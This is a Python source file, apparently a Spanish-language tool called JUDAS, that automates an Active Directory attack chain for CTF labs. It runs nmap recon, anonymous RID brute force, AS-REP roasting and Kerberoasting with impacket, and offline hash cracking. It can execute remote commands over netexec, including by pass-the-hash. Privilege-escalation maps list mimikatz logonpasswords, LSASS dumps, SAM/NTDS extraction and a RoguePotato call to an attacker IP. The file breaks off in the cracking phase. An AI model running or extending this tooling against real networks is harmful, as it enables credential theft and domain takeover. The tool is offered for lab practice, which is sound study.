#!/usr/bin/env python3
"""
JUDAS — AD Attack Chain Automation
Basado en OCD Active Directory Attack Mindmap 2025
Solo para entornos controlados: HTB, THM, VulnHub, labs propios.
"""

import json
import sys
import os
import re
import subprocess
import shutil
import shlex
import time
import argparse
from dataclasses import dataclass, field, asdict
from typing import Optional
from enum import Enum
from pathlib import Path

# ─── COLORES ────────────────────────────────────────────────────────────────
R      = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
MAGENTA= "\033[95m"
GRAY   = "\033[90m"

BANNER = f"""{BOLD}{RED}
     ██╗██╗   ██╗██████╗  █████╗ ███████╗
     ██║██║   ██║██╔══██╗██╔══██╗██╔════╝
     ██║██║   ██║██║  ██║███████║███████╗
██   ██║██║   ██║██║  ██║██╔══██║╚════██║
╚█████╔╝╚██████╔╝██████╔╝██║  ██║███████║
 ╚════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{R}
{BOLD}{GRAY}  AD Attack Chain  ·  OCD Mindmap 2025
  Solo entornos controlados: HTB · THM · VulnHub{R}
"""

# ─── PORTADA (imagen ANSI, pre-renderizada — sin dependencias en runtime) ───
IMAGE_BLOCK = "█"
IMAGE_W = 40
IMAGE_ROWS = [
    "190a1e1911250a124d0715670d215630566e20598123578045487b5e385d812f2e804738896a566250545f5761a78c6e556b785f8280597d816085944c7a9c17479d25256882574c56555b1552901152a25c334f4c324d2b4665394e6e7a4e40304a62096eab123b740c184b12204a0c2152081b4f0e1230",
    "0d154112183d1b30573b6d7a697470364c5f3371922f88b31b70ad1767b85d6472b48b418a3f24733d43854739af763387482b97492698603cb16e37c2a951a9a178a18463b68642a07947584f5d3a2e6825406f0d679c1c4b7b46496e5447503344520a3a5e10305b3f292d4733302726400a194f0b1f5c",
    "103275420b204b343f1ca8d92c81b959415f6c5966596f8c2d5784284d74523546663525993210d24c07bc7023b7912b946b459c4d25aa601dac6321baa153cebd58b8933faa7e2cba8427bb4f18b04d15b66b299f762a75493a2a356a1c4d870e4083053a8e0f2755391c24191d350e2e510c1f391c1c37",
    "3f0a174c11334324543c4276563a62584d769c52706330534c2849582a28843f249d5d2dc69246cfa464d1bf79c0b161acaa74aa8856bb813996764bb2a269bca350b27b30a06d36bda133c5ad4cb7a571a37a44ce861c92551d622d187a4c214d24301c27580b41731a385a1d19382733481c2d5226123d",
    "2e142e092f82133c7e15355a255a7e4042627c2620955d2b886749734835a26526bfb673d4d2879d8f6a706763a29c8cb6a79c726575403852544b5c71566c855f779b7882af877bbb9678c9bc7bd1bd5fe2d236cca82b9567318b6a2e6a39257e1d1861070f571f2f2432551d213e182035311624361836",
    "3e1c26191e360e305a1a5673392a3e711f118b4a20b9681f74412283502e9f6b2cc48a4389633b66606dc0c0c7d2d1d8dadbe0d8c7cb8b6a782e2136241f33412e3e4a324c50324f60415b6c4a5e85605da48352baa151d8ce73d3c36d74613853131d940f1177030c5008133b2327172f541c2e50181b2e",
    "161d351223590f2d68362633440a0e991f139f20154e1d22aa5d1e9f68379c622c934a1f50333ba6969f76565c171022483a4d644c5a6849544d2e3a0e0f231c222d3a35404837463926372e1827381b2d371c3d6a4c4bb39546ab8740836e449073366e2c1d6e02127b0e17470a13102466073088161d3b",
    "2b2b2c0e326f102a6f460a185a0d148a0c105e1019363730684629886b379b7338895f4d7e637387515b987981b0a8b0b3a0ac8a738072515d59323a2d192b0a0f26302a355d4c576e5b6b4b3a4d2619292c1a23240c253f1b25775e32977831a3893d584c336f301a963017550c132e0a1323152a172d49",
    "1e2b4304398020204a3c0d1751212445121a5637259f7e48a28c42b46f2eae6a2a5d453c2a182f664d5eccb1bbd8b1b1a06e6e63343b48242c341d281e172a0c10260f13291e21362f2b3b2d26351f17291b11241a132208021f856228b28027825b336c5c3d753d20c83e1498110c5407103c0f1e151637",
    "20173029143632112352221f5839324f1b1b672d1fa38750ac8843d0c363a085353b31475b415554415544374e5c455b5235453b253a352541271e370f11290d1128111229020d27010b210c0e1d0c0d23140f240c102309081da8812ea35824915f34afa95849291d792f187a16107b070a410c2b081d59",
    "391125490d2523162a60201b7b1b16731415471f1f8c6435b67f34d2a73a927b504d3b5467556a6e5264291a2e231c33352b3f33283f2f2443221a340a102810132817172b0910271c1a2d161529040b231c12250c06203d3832c9ba67ab974ec39d309c45215e2618975622721f137a18102910290f2150",
    "5d201b4b03145d0c175f16188a2e1ba94320562925923c1ce9951aaf6e29221830120f2d3b2d41241e361d1a301f1c3216172f0c1028060d23050e251513231b1624041028101327261d29211c2e1b1a331b1725170e2150423abda876c3ac4aebb72299451f873f1ae5811ba92e126b101022142d181930",
    "2a45512a17274d0c16660b13894621b36023a84b25853f23664422975f25533c1e70602b4333290109260610280a11240b11250c11270f12231c14212c1a262618261013290b12281b1c272725323c2d40261c2c1013240f0f24432b2bab822ca4811e933525a7371d8b471e863016491a1d071b410f1637",
    "223c481b1e312e1522291d264a1c1aa54218993a1c9f32197f32229150239e713b433b371918290910281613261e14211d13211e131f2618253a21304f2a363d222e1f1728030c26080d2814152b231d2d15142605091e222032412c41361628892017b92b11a1321e7c3923591d1c1a2b3b0b233c0a2842",
    "112a4d151634391329352c29292e29491d1b762c1aaa3a16c2401b7c311e2e20290907241f1a2d0d0f251f162624141f20131f2c17214225305d343e4b262f371c272616251b1b2e322738211a2f21172a1513223223366a45586546591a1b333b232a7823175f110f36151c302f2c1f2e3c0e223b09213e",
    "0e17300e274a16264b1f283a17233e1b2843371625661b1892411db28a3c70674f3223362e1d320a112a16142a351d2b2112212e15234b2b3c532e3b46222f462c3b422b3e3f293a2b20330a112814172c1c1b2f2c243534202f34041f42081f3b0d28380c222b142519173a1b224507183a0e243d0a2139",
    "2826403029540d2751082a4e40314646394b1c2232220c1e331d2a524844392a39261a2b14132619121f4d344165414c44252d6141477b59636f515a726476685b6e352d4123213706132e1e0a264517291a14292b0d266c1025ab492ec130208c09208c11204b12272b132617183110334f122c3b0f1c34",
    "11345a173b6c1c1e54282349471b2a3b16231f273e20396b134d9e1867b41b65990b44870b255e223d6728375c2b45702f4a722f466f28547a3078a44e49666b1c30530a1f3708249307179c101c511326520a2dbc1325dc2b1cbd2e19921918990713a2080f4f06183d081c271728172337091e4606214e",
    "0c24761c1d5b3c1e2f4e2c38402334411e2b2f2a580451bf20449c7738452555a20843a1082771063991094da9043b8f043f9b0932862e2358441c4756051f7a031ac72319d62d1d970f193612294c0235b72b27d6331aaa1c107300107e0e11e90b09aa03094f0b1942081b3b041d1e0b210e1a41082057",
    "0d204d342739552d393f29393f2839371a2c461c262e397117276a4a070f0f2f8109388e0b3d9506369507348115123c22163e380b245e0215760210960711b90e13bf331557201a1708252f0c35a75823f36c0ba7130c41001629091d9b2a15b11c1147061a1b0d2227091f45061c3a051a0f0a1d180f28",
    "061e3c0f1d35200f1f280f1e2c132338122042182666343b7c5e758c555c243179032e8e042573101f5c390d2b5803125d03105e020e3f0719640818a108106b0c16160a1f1908204d051e8b291fef530d97060a2a001a740f16730a1abb0f0d780610230a1e1e1020140f2232071c450414110a1f120a1e",
    "0024552b17402f1123291624441d2a4119234b1f2c743d48a96b7289575e242158031c622214334e03155501114305184f05145405185c0b1c3f1122180e230c0c2131091e3c0d1f620d1a8d0e124f001723081e400d197f131c76061b5406191d0c21250f1e24172321111f3805174506112b0b17030c21",
    "1e1b3e480f233f0d28271626512d3877424b6e37405c324154273630111f170e251512281f112440071a51041643081b720917600a1c2d0d1f080e26210b21330a1d4b0a1a520a183e05172b051a210b1f3d082273141e6f0f1b3d071c210b20240f20321121150b1e2d081c4905164c040f300818070d22",
    "2e0a2325081f410b23250e291d12214825325326333912222a0f1f190e22180b1e160d231c0e262a0b2056051b5908194e0b181b0c1e050d25290a214a061d6307135803102e071a1c0a20210b1f4705204008261d091e010a21000c2a00113709102f290e273b0b1e530a174d0818330d291f0c270b0d21",
    "32081a1f0b210e194936355f241d2f180817290b192f0b1c180d20070d210b0f25220d2336061f44031d3c071d160c210e0c20100d21290c1e4e0a1c290d22250b1e1e0b200d0e211f0c20420a1f300c20280b1d1c0f2a37153254152f610c2f790d27670a24500e25540918250c23061331070e28110b1b",
    "0f0c240113400215471d192f1310211f0d1b220d1b1a0c1d080c27070e2a0e1129190f26160b23110b20090b201b09213b071e220c21170c1f0c0c22150d20160d210f0d21160d21290c223a0e1e48151c500c1e2d0e334d1334661425780d24830e256f08234a0a293c143118152d090e230a0e220b0d1e",
    "040e2e040f35050e3003091c080b20140c1f0c0c20050c21090d270a0c230c0a20120a1f0e0c200f0c1f2e1227380e23410a1f430a20640e1e660a1a3e0a21290b234d09213e122f1e13312f0b253b081f2e081f110a1e000a1e000b22000e23000d26190c242f091e330e21441d2c25182a080c210b0d1f",
    "060b24050d28050d29070b1f060b20000d21020c200a0c200a0e22331929421e2b3d15263821302a1c2c63152b8c14206e121f6d0e1a700a12580a1a300b202a081f33081d5105185a06184705162d061c390d264e0c1d4c0e181d0c200e0d25080d23040b1f010b2003091f06081d090a200d0c1e0a0c1e",
    "050c29050e2b050d26030b200a0e232a0a1d3605192a061926081a190f211e142419182c09142d0710251c081d4205173b041b6505143e0816010c241b0b2131081d180a1e070e22260b1d6c06145b0616270a1f1314315c1722480b19100d240a0d240e0b20090b1f0a0b20090b1f02081f070a1f090c1c",
    "050c28060b25070b22080d2016122626091c34081b3f061a37071928071a1c081c0e0c20050b1f050b200e0d211c0a1d250919270919270c1b110d2026092032071c31081a0e0d1f070c21180a1e2e091f5f0618300618130c20190d2206113105133605102f080e260d0c21220b191b09180a0919070918",
    "050a24050920080b1b080a1c07091c010b1e0d0c1d1c0a1d180a1e110b1f090b200e0d20100e21080c220a0d1f0b0d1e0f0b1d180b1c110c23060c25100c1e29081a2d081922091b080b200a0c20000f2b150b255a06153b0a18020b20070c200c0d23060c23060d200c0c1e2108142808140e0b1a070919",
    "050920090a1c0f0a180f0a1a090c19080b1a05081801091d060b21090d1e130d19110d1d0a0a1e070b200b0c1e0a0c1d080b21060c210a0d230a0c220a0c1f1b0a1a1b081a2a08171a091d060b200a0b1d080b2026081a3b12221d14270a0a1e090a1d120b1a110b17080a19060919060819030819060819",
    "060921080a180a0a1a0c0a1a0c0919100818160a17140c1b0f0c1b0f0b190a0a1906081c070a20070c24080a220a0b1c0f091a0f091d0d0a1e070b1f050a1f0c0c1d120c1b180a19100c1e070b20090b1c080c1b020c20030c20141029120f2406091e0b091a1209190a091907081904081901061a02051a",
    "060a1f06091a08091a0c09180f08181009160f0a170d0917090918070a1a07091d070a20080a1e06081b07081c0a0c1b190a181a091917091a1a0917130918070b20090c1e0b0b1a070c1e070a2007071c0909190a08180a071706071707091c0a0a1e090a1a06081905081a02081a01081a01071a01071a",
    "03061601051601051700061a0008190208170608190a0a19080a1809091907091c060919050817070818080918070b1a0d0a1b1809171809181f09192308150d091d070b1d080818080919080b1b08081c09081809081809081809081809081709081708081905081901081b01081a02071b01071a010719",
]

def render_image_banner() -> str:
    """Renderiza la portada JUDAS como arte de bloques ANSI (truecolor), sin dependencias externas."""
    lines = []
    for row in IMAGE_ROWS:
        chars = []
        for i in range(0, len(row), 6):
            hexpix = row[i:i+6]
            r, g, b = int(hexpix[0:2], 16), int(hexpix[2:4], 16), int(hexpix[4:6], 16)
            chars.append(f"\033[38;2;{r};{g};{b}m{IMAGE_BLOCK}")
        lines.append("".join(chars) + R)
    return "\n".join(lines)

# ─── LOGGING ────────────────────────────────────────────────────────────────
def log_phase(name: str) -> None:
    print(f"\n{BOLD}{MAGENTA}{'═'*62}\n  ⚔  {name}\n{'═'*62}{R}")

def log_step(msg: str) -> None:
    print(f"\n{BOLD}{CYAN}[*]{R} {msg}")

def log_ok(msg: str) -> None:
    print(f"{GREEN}[+]{R} {msg}")

def log_warn(msg: str) -> None:
    print(f"{YELLOW}[!]{R} {msg}")

def log_err(msg: str) -> None:
    print(f"{RED}[-]{R} {msg}")

def log_info(msg: str) -> None:
    print(f"{GRAY}    {msg}{R}")

def log_cmd(cmd: str) -> None:
    print(f"{DIM}    $ {cmd}{R}")

# ─── ESTADO COMPARTIDO ──────────────────────────────────────────────────────
@dataclass
class JudasContext:
    target_ip:    str  = ""
    domain:       str  = ""
    dc_ip:        str  = ""
    output_dir:   str  = "judas_output"

    # Red
    open_ports:   list = field(default_factory=list)
    smb_signing:  bool = True

    # Usuarios
    users:        list = field(default_factory=list)

    # Hashes
    hashes_asrep: dict = field(default_factory=dict)   # user -> hash
    hashes_kerb:  dict = field(default_factory=dict)   # user -> hash
    hashes_ntlm:  dict = field(default_factory=dict)   # user -> NThash

    # Credenciales crackeadas
    cracked:      dict = field(default_factory=dict)   # user -> password

    # Acceso validado
    valid_smb:    list = field(default_factory=list)   # [(user, pass)]
    valid_winrm:  list = field(default_factory=list)   # [(user, pass)]
    valid_pth:    list = field(default_factory=list)   # [(user, NThash)] Pass-the-Hash
    admin_smb:    list = field(default_factory=list)   # [(user, pass)] Pwn3d!

    # Post-explotación
    current_user:  str  = ""
    current_groups: list = field(default_factory=list)
    privileges:    list = field(default_factory=list)
    net_groups:    dict = field(default_factory=dict)  # group -> [members]

    # Control de flujo
    phase_done:   list = field(default_factory=list)

    @property
    def domain_dn(self) -> str:
        return ",DC=".join(self.domain.split("."))

    def best_creds(self) -> Optional[tuple]:
        """Retorna las mejores credenciales disponibles: (user, pass) o (user, None, hash)."""
        if self.admin_smb:
            return self.admin_smb[0]
        if self.valid_winrm:
            return self.valid_winrm[0]
        if self.valid_smb:
            return self.valid_smb[0]
        if self.cracked:
            u = list(self.cracked.keys())[0]
            return (u, self.cracked[u])
        if self.valid_pth:
            u, h = self.valid_pth[0]
            return (u, None, h)
        return None

    def save(self) -> None:
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        with open(f"{self.output_dir}/judas_state.json", "w") as f:
            json.dump(asdict(self), f, indent=2, ensure_ascii=False)

    @classmethod
    def load(cls, path: str) -> "JudasContext":
        with open(path) as f:
            data = json.load(f)
        ctx = cls()
        for k, v in data.items():
            if hasattr(ctx, k):
                setattr(ctx, k, v)
        return ctx


# ─── EJECUTOR DE COMANDOS ────────────────────────────────────────────────────
class Runner:
    def __init__(self, ctx: JudasContext):
        self.ctx = ctx
        Path(ctx.output_dir).mkdir(parents=True, exist_ok=True)

    def run(self, cmd: str, timeout: int = 120) -> tuple[str, str, int]:
        log_cmd(cmd)
        try:
            r = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=timeout,
                env={**os.environ}
            )
            return r.stdout, r.stderr, r.returncode
        except subprocess.TimeoutExpired:
            log_warn(f"Timeout ({timeout}s) — comando cancelado")
            return "", "TIMEOUT", -1
        except Exception as e:
            return "", str(e), -1

    def available(self, tool: str) -> bool:
        return shutil.which(tool) is not None

    def save(self, name: str, content: str) -> str:
        path = f"{self.ctx.output_dir}/{name}"
        with open(path, "w") as f:
            f.write(content)
        return path

    def exec_remote(self, command: str, user: str, password: Optional[str],
                    nthash: Optional[str] = None) -> str:
        """Ejecuta comando remoto vía WinRM o SMB. Soporta password y Pass-the-Hash."""
        ctx = self.ctx
        qu = shlex.quote(user)
        proto = "winrm" if any(u == user for u, *_ in ctx.valid_winrm) else "smb"

        if nthash:
            qh = shlex.quote(nthash)
            cmd = (f"netexec {proto} {ctx.target_ip} -u {qu} -H {qh} "
                   f"-d {shlex.quote(ctx.domain)} -x {shlex.quote(command)} 2>/dev/null")
        else:
            qp = shlex.quote(password or "")
            cmd = (f"netexec {proto} {ctx.target_ip} -u {qu} -p {qp} "
                   f"-d {shlex.quote(ctx.domain)} -x {shlex.quote(command)} 2>/dev/null")

        out, _, _ = self.run(cmd, timeout=30)
        lines = []
        for line in out.splitlines():
            m = re.search(r'(?:WINRM|SMB)\s+\S+\s+\d+\s+\S+\s+(.*)', line)
            if m:
                content = m.group(1).strip()
                if content and not content.startswith("["):
                    lines.append(content)
        return "\n".join(lines) if lines else out


# ─── PARSERS ─────────────────────────────────────────────────────────────────
def parse_rid_users(output: str) -> list[str]:
    users = []
    for line in output.splitlines():
        m = re.search(r'SidTypeUser.*?\\(\w[\w.-]+)', line)
        if m:
            u = m.group(1)
            if u.lower() not in ("guest", "krbtgt") and not u.endswith("$"):
                users.append(u)
    return list(set(users))

def parse_netexec_users(output: str) -> list[str]:
    users = []
    for line in output.splitlines():
        m = re.search(r'\\\s*([\w][\w.-]+)\s', line)
        if m:
            u = m.group(1)
            if u.lower() not in ("guest", "krbtgt") and not u.endswith("$"):
                users.append(u)
    return list(set(users))

def parse_asrep_user(hash_line: str) -> str:
    """Retorna el usuario de un hash AS-REP, o '' si no aplica."""
    m = re.search(r'\$krb5asrep\$\d*\$?([^@$]+)[@$]', hash_line)
    return m.group(1).lower() if m else ""

def parse_kerb_user(hash_line: str) -> str:
    m = re.search(r'\$krb5tgs\$\d+\$\*([^*]+)\*', hash_line)
    return m.group(1).lower() if m else "unknown"

def parse_cracked_hashcat(pot_file: str, hash_file: str) -> dict:
    """Lee hashcat potfile y mapea hashes a contraseñas."""
    cracked = {}
    if not Path(pot_file).exists():
        return cracked
    pot = Path(pot_file).read_text()
    hashes_raw = Path(hash_file).read_text().splitlines() if Path(hash_file).exists() else []
    for line in pot.splitlines():
        if ":" not in line:
            continue
        idx = line.rfind(":")
        h_fragment = line[:idx]
        password = line[idx+1:]
        for full_hash in hashes_raw:
            if h_fragment in full_hash:
                user = parse_asrep_user(full_hash) or parse_kerb_user(full_hash)
                cracked[user] = password
    return cracked

def parse_john_cracked(output: str) -> dict:
    cracked = {}
    for line in output.splitlines():
        m = re.match(r'^(\S+)\s+\((.+?)\)', line)
        if m:
            cracked[m.group(2).lower()] = m.group(1)
    return cracked

def parse_whoami_all(output: str) -> dict:
    result = {"user": "", "groups": [], "privileges": []}

    # Usuario
    for line in output.splitlines():
        m = re.match(r'\s*(\S+\\\S+)\s*$', line)
        if m and "\\" in m.group(1) and not m.group(1).startswith("\\"):
            result["user"] = m.group(1)
            break

    # Grupos
    in_groups = False
    for line in output.splitlines():
        if re.search(r'group information', line, re.I):
            in_groups = True
            continue
        if in_groups:
            if re.search(r'privilege information', line, re.I):
                break
            stripped = line.strip()
            if stripped and not re.match(r'^[-=\s]+$', stripped) and \
               not re.match(r'^(Group Name|Type|SID|Attributes)', stripped, re.I):
                parts = re.split(r'\s{2,}', stripped)
                if parts and len(parts[0]) > 2:
                    result["groups"].append(parts[0].strip())

    # Privilegios — solo los que estén en estado "Enabled"
    priv_list = [
        "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
        "SeBackupPrivilege", "SeRestorePrivilege", "SeLoadDriverPrivilege",
        "SeTakeOwnershipPrivilege", "SeDebugPrivilege", "SeManageVolumePrivilege",
        "SeTcbPrivilege", "SeCreateTokenPrivilege",
    ]
    for priv in priv_list:
        for line in output.splitlines():
            if priv in line:
                if re.search(r'\bEnabled\b', line, re.I) and not re.search(r'\bDisabled\b', line, re.I):
                    result["privileges"].append(priv)
                break

    return result

def parse_net_group_members(output: str) -> list[str]:
    members = []
    capture = False
    for line in output.splitlines():
        if re.search(r'members|miembros', line, re.I):
            capture = True
            continue
        if capture:
            line = line.strip()
            if not line or re.match(r'^[-]+$', line):
                continue
            if re.search(r'command completed|successfully', line, re.I):
                break
            parts = line.split()
            members.extend(p.strip() for p in parts if p.strip())
    return members

def parse_open_ports(nmap_output: str) -> list[int]:
    """Parsea puertos abiertos línea por línea para evitar falsos positivos."""
    ports = []
    for line in nmap_output.splitlines():
        m = re.match(r'\s*(\d+)/tcp\s+open\s', line)
        if m:
            ports.append(int(m.group(1)))
    return ports


# ─── MAPA PRIVILEGIOS / GRUPOS → ATAQUES ────────────────────────────────────
PRIV_ATTACKS = {
    "SeImpersonatePrivilege": [
        ("PrintSpoofer",  "PrintSpoofer64.exe -i -c cmd"),
        ("GodPotato",     "GodPotato.exe -cmd 'cmd /c whoami'"),
        ("JuicyPotatoNG", "JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'"),
    ],
    "SeAssignPrimaryTokenPrivilege": [
        ("PrintSpoofer",  "PrintSpoofer64.exe -i -c cmd"),
        ("RoguePotato",   "RoguePotato.exe -r <attacker_ip> -e 'cmd.exe'"),
    ],
    "SeBackupPrivilege": [
        ("Volcado SAM/SISTEMA", "reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak"),
        ("Diskshadow",      "diskshadow /s script.txt  → copia VSS de NTDS.dit"),
    ],
    "SeRestorePrivilege": [
        ("Secuestro de DLL",  "Reemplazar DLL de servicio privilegiado con payload"),
    ],
    "SeLoadDriverPrivilege": [
        ("Exploit Capcom", "eoploaddriver.exe + exploit kernel"),
    ],
    "SeDebugPrivilege": [
        ("Volcado LSASS",  "procdump.exe -ma lsass.exe lsass.dmp"),
        ("mimikatz",    "mimikatz.exe \"sekurlsa::logonpasswords\" exit"),
    ],
    "SeTakeOwnershipPrivilege": [
        ("Tomar propiedad", "takeown /f C:\\ruta\\objetivo /a && icacls ... /grant Everyone:F"),
    ],
    "SeManageVolumePrivilege": [
        ("Escritura arbitraria de archivo", "Escritura directa en volumen → reemplazar binario privilegiado"),
    ],
}

GROUP_ATTACKS = {
    "domain admins":           ("CRÍTICO", "¡Domain Admin!",                   "impacket-secretsdump (DCSync)"),
    "enterprise admins":       ("CRÍTICO", "Administrador de Empresa",          "Control total del bosque AD"),
    "backup operators":        ("ALTO",    "Operadores de copia de seguridad",  "SeBackupPrivilege → volcado SAM/NTDS.dit"),
    "server operators":        ("ALTO",    "Operadores de servidor",            "Modificar servicios del sistema → SYSTEM"),
    "print operators":         ("ALTO",    "Operadores de impresión",           "SeLoadDriverPrivilege → driver de kernel"),
    "dnsadmins":               ("ALTO",    "Administradores DNS",               "Plugin DLL en DNS → SYSTEM en DC"),
    "account operators":       ("MEDIO",   "Operadores de cuentas",             "Crear/modificar usuarios en AD"),
    "remote management users": ("MEDIO",   "Usuarios de administración remota", "Acceso WinRM confirmado"),
    "schema admins":           ("ALTO",    "Administradores de esquema",        "Modificar esquema AD"),
    "administrators":          ("CRÍTICO", "Administradores locales",           "mimikatz / volcado SAM"),
    "builtin\\administrators": ("CRÍTICO", "Admin local",                       "mimikatz / volcado SAM"),
}


# ─── CADENA DE ATAQUE ────────────────────────────────────────────────────────
class JudasChain:
    def __init__(self, ctx: JudasContext, runner: Runner):
        self.ctx = ctx
        self.r   = runner

    # ── FASE 1: RECONOCIMIENTO ─────────────────────────────────────────────
    def phase_recon(self) -> None:
        ctx = self.ctx
        log_phase("FASE 1 — RECONOCIMIENTO")

        log_step("Escaneando puertos AD estándar...")
        ports = "21,22,25,53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986"
        out, _, _ = self.r.run(
            f"nmap -p {ports} --open -T3 -sV {ctx.target_ip} -oN {ctx.output_dir}/nmap.txt",
            timeout=240
        )
        self.r.save("nmap_raw.txt", out)

        ctx.open_ports = parse_open_ports(out)
        log_ok(f"Puertos abiertos: {ctx.open_ports}")

        if 445 in ctx.open_ports:
            log_step("Verificando SMB Signing...")
            out2, _, _ = self.r.run(f"netexec smb {ctx.target_ip} 2>/dev/null")
            ctx.smb_signing = "signing:False" not in out2 and "signing: False" not in out2
            if not ctx.smb_signing:
                log_warn("SMB Signing DESHABILITADO → NTLM Relay posible")
                log_info(f"  netexec smb {ctx.target_ip}/24 --gen-relay-list {ctx.output_dir}/relay_targets.txt")
            else:
                log_info("SMB Signing habilitado")

        ctx.phase_done.append("recon")
        ctx.save()

    # ── FASE 2: ENUMERACIÓN DE USUARIOS ───────────────────────────────────
    def phase_enum_users(self) -> None:
        ctx = self.ctx
        log_phase("FASE 2 — ENUMERACIÓN DE USUARIOS")

        users_found: list[str] = []

        log_step("RID brute force (anónimo)...")
        out, _, _ = self.r.run(
            f"netexec smb {ctx.dc_ip} -u '' -p '' --rid-brute 2>/dev/null",
            timeout=90
        )
        users_found += parse_rid_users(out)

        if not users_found and 389 in ctx.open_ports:
            log_step("LDAP anónimo...")
            out2, _, _ = self.r.run(
                f"netexec ldap {ctx.dc_ip} -u '' -p '' --users 2>/dev/null",
                timeout=60
            )
            users_found += parse_netexec_users(out2)

        creds = ctx.best_creds()
        if not users_found and creds:
            u = creds[0]
            p = creds[1] if len(creds) <= 2 else None
            nt = creds[2] if len(creds) > 2 else None
            if p and p.startswith("HASH:"):
                nt = p[5:]
                p = None
            if p is not None or nt is not None:
                log_step(f"Enumeración autenticada como {u}...")
                qu = shlex.quote(u)
                if nt:
                    out3, _, _ = self.r.run(
                        f"netexec smb {ctx.dc_ip} -u {qu} -H {shlex.quote(nt)} "
                        f"-d {shlex.quote(ctx.domain)} --users 2>/dev/null",
                        timeout=60
                    )
                else:
                    out3, _, _ = self.r.run(
                        f"netexec smb {ctx.dc_ip} -u {qu} -p {shlex.quote(p)} "
                        f"-d {shlex.quote(ctx.domain)} --users 2>/dev/null",
                        timeout=60
                    )
                users_found += parse_netexec_users(out3)

        if users_found:
            ctx.users = list(set(users_found))
            ufile = self.r.save("users.txt", "\n".join(ctx.users))
            log_ok(f"{len(ctx.users)} usuarios → {ufile}")
            log_info(f"  {ctx.users[:8]}{'...' if len(ctx.users) > 8 else ''}")
        else:
            log_warn("Sin usuarios encontrados. Usa --users <archivo> para proveer lista.")

        ctx.phase_done.append("enum_users")
        ctx.save()

    # ── FASE 3: AS-REP ROASTING ────────────────────────────────────────────
    def phase_asrep(self) -> None:
        ctx = self.ctx
        if not ctx.users:
            log_warn("Sin usuarios — saltando AS-REP Roasting")
            return

        log_phase("FASE 3 — AS-REP ROASTING")

        ufile    = f"{ctx.output_dir}/users.txt"
        hashfile = f"{ctx.output_dir}/asrep_hashes.txt"
        if not Path(ufile).exists():
            Path(ufile).write_text("\n".join(ctx.users))
            log_info(f"Escrito {ufile} ({len(ctx.users)} usuarios)")

        log_step("Buscando cuentas sin pre-autenticación Kerberos...")
        out, _, _ = self.r.run(
            f"impacket-GetNPUsers {shlex.quote(ctx.domain)}/ -dc-ip {ctx.dc_ip} "
            f"-no-pass -usersfile {shlex.quote(ufile)} -format hashcat "
            f"-outputfile {shlex.quote(hashfile)}",
            timeout=90
        )

        if Path(hashfile).exists():
            raw = Path(hashfile).read_text().strip()
            for line in raw.splitlines():
                if line.startswith("$krb5asrep"):
                    user = parse_asrep_user(line)
                    if user:
                        ctx.hashes_asrep[user] = line
                        log_ok(f"AS-REP hash: {user}")

        if not ctx.hashes_asrep:
            log_info("Sin cuentas AS-REP Roastables")

        ctx.phase_done.append("asrep")
        ctx.save()

    # ── FASE 4: KERBEROASTING (con credenciales) ───────────────────────────
    def phase_kerberoast(self) -> None:
        ctx = self.ctx
        creds = ctx.best_creds()
        if not creds:
            log_warn("Sin credenciales — saltando Kerberoasting")
            return

        u = creds[0]
        p = creds[1] if len(creds) <= 2 else None
        nthash = creds[2] if len(creds) > 2 else None
        if p and p.startswith("HASH:"):
            nthash = p[5:]
            p = None
        if p is None and nthash is None:
            log_warn("Sin credenciales de contraseña — saltando Kerberoasting")
            return

        log_phase("FASE 4 — KERBEROASTING")
        hashfile = f"{ctx.output_dir}/kerb_hashes.txt"
        qu = shlex.quote(u)

        log_step(f"Solicitando TGS para cuentas con SPN ({u})...")
        if nthash:
            out, _, _ = self.r.run(
                f"impacket-GetUserSPNs {shlex.quote(ctx.domain)}/{qu} -hashes :{shlex.quote(nthash)} "
                f"-dc-ip {ctx.dc_ip} -request -outputfile {shlex.quote(hashfile)}",
                timeout=60
            )
        else:
            qp = shlex.quote(p)
            out, _, _ = self.r.run(
                f"impacket-GetUserSPNs {shlex.quote(ctx.domain)}/{qu}:{qp} "
                f"-dc-ip {ctx.dc_ip} -request -outputfile {shlex.quote(hashfile)}",
                timeout=60
            )

        if Path(hashfile).exists():
            for line in Path(hashfile).read_text().splitlines():
                if line.startswith("$krb5tgs"):
                    user = parse_kerb_user(line)
                    ctx.hashes_kerb[user] = line
                    log_ok(f"Kerberoast hash: {user}")

        if not ctx.hashes_kerb:
            log_info("Sin cuentas Kerberoastables")

        ctx.phase_done.append("kerberoast")
        ctx.save()

    # ── FASE 5: CRACKING ───────────────────────────────────────────────────
    def phase_crack(self) -> None:
        ctx = self.ctx
        all_hashes = {**ctx.hashes_asrep, **ctx.hashes_kerb}
        if not all_hashes:
            log_warn("Sin hashes — saltando cracking")
            return

        log_phase("FASE 5 — CRACKING DE HASHES")

        wl_candidates = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/wordlists/fasttrack.txt",
            "/opt/wordlists/rockyou.txt",
        ]
        wordlist = next((w for w in wl_candidates if Path(w).exists()), None)
        if not wordlist:
            log_err("Wordlist no encontrada. Instala rockyou.txt en /usr/share/wordlists/")
            return

        cracker = "hashcat" if self.r.available("hashcat") else \
                  ("john" if self.r.available("john") else None)
        if not cracker:
            log_err("Ni hashcat ni john disponibles")
            return

        log_info(f"Cracker: {cracker} | Wordlist: {wordlist}")

        if ctx.hashes_asrep:
            hfile = f"{ctx.output_dir}/asrep_hashes.txt"
            pot   = f"{ctx.output_dir}/asrep.pot"
            log_step(f"Crackeando {len(ctx.hashes_asrep)} AS-REP hash(es)...")
            if cracker == "hashcat":
                self.r.run(
                    f"hashcat -m 18200 {shlex.quote(hfile)} {shlex.quote(wordlist)} "
                    f"--force -q --potfile-path {shlex.quote(pot)} 2>/dev/null",
                    timeout=600
                )
                ctx.cracked.update(parse_cracked_hashcat(pot, hfile))
            else:
                self.r.run(
                    f"john {shlex.quote(hfile)} --wordlist={shlex.quote(wordlist)} --format=krb5asrep",
                    timeout=600
                )
